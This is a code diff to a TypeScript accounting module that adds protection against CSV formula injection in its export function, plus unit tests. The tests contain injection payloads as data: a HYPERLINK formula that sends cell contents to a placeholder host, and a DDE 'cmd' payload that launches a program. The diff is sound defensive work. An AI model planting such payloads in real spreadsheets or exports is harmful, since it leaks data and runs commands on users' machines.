@@ -678,6 +678,8 @@ function unitChecks() {
   ok(parseDay("05/03/2026") === "2026-03-05" && parseDay("05-Mar-26") === "2026-03-05" && parseDay("2026-03-05") === "2026-03-05" && parseDay("5 Mar 2026") === "2026-03-05", "parseDay: day-first Indian formats");
   ok(JSON.stringify(parseCsv('a,"b,""c""",d\r\n1,2,3\n')) === JSON.stringify([["a", 'b,"c"', "d"], ["1", "2", "3"]]), "parseCsv: quotes, doubled quotes, CRLF");
   ok(toCsv(["a", "b"], [["x,y", 5]]) === 'a,b\r\n"x,y",5\r\n', "toCsv quotes commas, CRLF lines");
+  ok(toCsv(["a", "b", "c", "d"], [['=HYPERLINK("https://x.example/?c="&A1,"OPEN")', "=cmd|'/c calc'!A1", "@SUM(A1)", "+1+1"]]) === 'a,b,c,d\r\n"\'=HYPERLINK(""https://x.example/?c=""&A1,""OPEN"")",\'=cmd|\'/c calc\'!A1,\'@SUM(A1),\'+1+1\r\n', "toCsv defuses formula cells (= + @, CSV injection)");
+  ok(toCsv(["a", "b", "c", "d"], [["-1234.50", -5, "-x", "\tcmd"]]) === 'a,b,c,d\r\n-1234.50,-5,\'-x,\'\tcmd\r\n', "toCsv keeps negative amounts numeric, defuses - and tab before text");
   ok(placeOfSupply({ branch: { stateCode: "22" } }) === "22" && placeOfSupply({ branch: { stateCode: "22" }, customer: { gstin: "27AAACM1234B1Z5" } }) === "27" && placeOfSupply({ branch: { stateCode: "22" }, override: "29" }) === "29", "placeOfSupply: override > customer > branch");
   const cfg = DEFAULT_FINANCE_CONFIG.tds;
   ok(computeTds({ sharePaise: 100000, priorSharePaise: 0, priorBasePaise: 0, partner: { pan: undefined, tds: null }, config: cfg }).rateBp === cfg.noPanRateBp, "TDS: no PAN → the no-PAN rate");
@@ -1709,8 +1711,17 @@ export async function settlementCsv(repos: Repositories, q: { orgId: Id; settlem
 
 export type Cell = string | number | null | undefined;
 
+/**
+ * A text cell starting with = + - @ (or tab / CR) is a formula to Excel and LibreOffice: a ledger name or
+ * narration like `=HYPERLINK(...)` would run on the CA's machine (CSV injection, CWE-1236). Such cells get
+ * a leading `'` so they open as text. Plain numbers (negative amounts from `rupees()`) are left alone.
+ */
+const FORMULA_START = /^[=+\-@\t\r]/;
+const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?$/;
+const defuse = (s: string): string => (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s) ? `'${s}` : s);
+
 const quote = (v: Cell): string => {
-  const s = v === null || v === undefined ? "" : String(v);
+  const s = v === null || v === undefined ? "" : typeof v === "number" ? String(v) : defuse(String(v));
   return /[",\r\n]/.test(s) || /^\s|\s$/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 };
 
